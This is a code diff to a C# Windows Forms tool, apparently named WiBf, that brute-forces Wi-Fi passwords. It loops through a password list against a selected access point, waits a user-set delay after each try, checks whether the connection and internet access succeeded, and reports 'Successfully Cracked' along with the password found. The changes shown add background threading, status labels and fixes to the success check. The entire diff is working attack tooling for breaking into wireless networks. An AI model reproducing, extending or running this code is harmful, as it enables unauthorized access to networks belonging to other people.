@@ -12,12 +12,15 @@ using SimpleWifi;
 using SimpleWifi.Win32;
 using NativeWifi;
 using System.Collections.ObjectModel;
+using System.Reflection;
+using System.Net;
 
 namespace WiBf
 {
 	public partial class Form1 : Form
 	{
 		private static Wifi wifi;
+		NativeWifi.WlanClient wlan = new NativeWifi.WlanClient();
 		List<string> passwords = new List<string>();
 
 		public Form1()
@@ -31,32 +34,82 @@ namespace WiBf
 			wifi.ConnectionStatusChanged += wifi_ConnectionStatusChanged;
 			linkLabel1.Links.Add(12, 7, "https://github.com/Tlgyt");
 			List();
+			label3.Text = "Status: idle";
 		}
 
-		private int check(AccessPoint selectedAP)
+		private delegate void SetControlPropertyThreadSafeDelegate(
+		Control control,
+		string propertyName,
+		object propertyValue);
+
+		public static void SetControlPropertyThreadSafe(
+				Control control,
+				string propertyName,
+				object propertyValue)
 		{
-			NativeWifi.WlanClient wlan = new NativeWifi.WlanClient();
+			if (control.InvokeRequired)
+			{
+				control.Invoke(new SetControlPropertyThreadSafeDelegate
+				(SetControlPropertyThreadSafe),
+				new object[] { control, propertyName, propertyValue });
+			}
+			else
+			{
+				control.GetType().InvokeMember(
+						propertyName,
+						BindingFlags.SetProperty,
+						null,
+						control,
+						new object[] { propertyValue });
+			}
+		}
+
+		private bool check(AccessPoint selectedAP)
+		{
 			Collection<String> connectedSsids = new Collection<string>();
-			if (WifiStatus.Connected.ToString() == "true")
+			if (WifiStatus.Connected.ToString() == "Connected")
 			{
 				foreach (NativeWifi.WlanClient.WlanInterface wlanInterface in wlan.Interfaces)
 				{
-					Wlan.Dot11Ssid ssid = wlanInterface.CurrentConnection.wlanAssociationAttributes.dot11Ssid;
-					connectedSsids.Add(new String(Encoding.ASCII.GetChars(ssid.SSID, 0, (int)ssid.SSIDLength)));
+					try
+					{
+						Wlan.Dot11Ssid ssid = wlanInterface.CurrentConnection.wlanAssociationAttributes.dot11Ssid;
+						connectedSsids.Add(new String(Encoding.ASCII.GetChars(ssid.SSID, 0, (int)ssid.SSIDLength)));
+					}
+					catch(Exception)
+					{
+						return false;
+					}
 				}
 				foreach (string ssid in connectedSsids)
 				{
 					if (selectedAP.Name == ssid)
 					{
-						return 1;
+						return true;
 					}
 					else
 					{
-						return 0;
+						return false;
 					}
 				}
 			}
-			return 0;
+			return false;
+		}
+
+		public static bool CheckForInternetConnection()
+		{
+			try
+			{
+				using (var client = new WebClient())
+				using (var stream = client.OpenRead("http://www.google.com"))
+				{
+					return true;
+				}
+			}
+			catch
+			{
+				return false;
+			}
 		}
 
 		private IEnumerable<AccessPoint> List()
@@ -94,6 +147,7 @@ namespace WiBf
 			}
 			foreach (string pass in passwords)
 			{
+				SetControlPropertyThreadSafe(label3, "Text", "Status: Trying Password: "+pass);
 				// Auth
 				AuthRequest authRequest = new AuthRequest(selectedAP);
 				bool overwrite = true;
@@ -107,7 +161,6 @@ namespace WiBf
 							Console.Write("\r\nPlease enter a username: ");
 							authRequest.Username = Console.ReadLine();
 						}
-
 						authRequest.Password = pass;
 
 						if (authRequest.IsDomainSupported)
@@ -119,7 +172,13 @@ namespace WiBf
 				}
 
 				selectedAP.ConnectAsync(authRequest, overwrite, OnConnectedComplete);
-				Thread.Sleep(100);
+				int i = Convert.ToInt32(textBox1.Text);
+				Thread.Sleep(i*1000);
+				if (check(selectedAP) == true && CheckForInternetConnection() == true)
+				{
+					SetControlPropertyThreadSafe(label3, "Text", "Status: Successfully Cracked: "+selectedAP.Name+" With Password: "+pass);
+					return;
+				}
 			}
 		}
 
@@ -137,7 +196,9 @@ namespace WiBf
 						selectedAP = ap;
 					}
 				}
-				crack(selectedAP);
+				Thread t = new Thread(() => crack(selectedAP));
+				t.IsBackground = true;
+				t.Start();
 			}
 			catch (Exception a)
 			{
